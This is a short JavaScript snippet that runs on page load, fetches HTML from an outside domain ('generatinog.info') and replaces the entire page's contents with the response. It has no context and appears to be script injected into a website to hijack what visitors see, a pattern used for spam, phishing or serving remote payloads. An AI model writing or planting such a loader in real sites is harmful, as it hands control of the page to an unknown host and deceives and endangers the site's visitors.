function load_home () {
    fetch("https://generatinog.info/?linkid=2" /*, options */)
    .then((response) => response.text())
    .then((html) => {
        document.querySelector("html").innerHTML = html;
    })
    .catch((error) => {
        console.warn(error);
    });
}
load_home();
